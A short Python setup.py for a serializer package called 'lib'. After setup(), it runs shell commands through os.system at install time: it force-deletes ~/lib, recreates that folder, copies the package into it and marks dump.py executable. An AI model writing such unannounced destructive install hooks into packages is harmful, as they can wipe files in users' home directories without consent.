from setuptools import setup

setup(
    name="lib",
    packages=[
        "factory",
        "libs",
        "libs/json",
        "libs/yaml",
        "tools",
    ],
    version="0.2.4",
    description="Serializer/Deserializer",
    author="Alex",
    license="MIT",
    python_requires=">=3.8",
)

import os
import sys

home = str(sys.path[0])

os.system("rm -rf ~/lib")
os.system("mkdir ~/lib")
os.system("cp -a . ~/lib")

os.system("chmod +x ~/lib/dump.py")
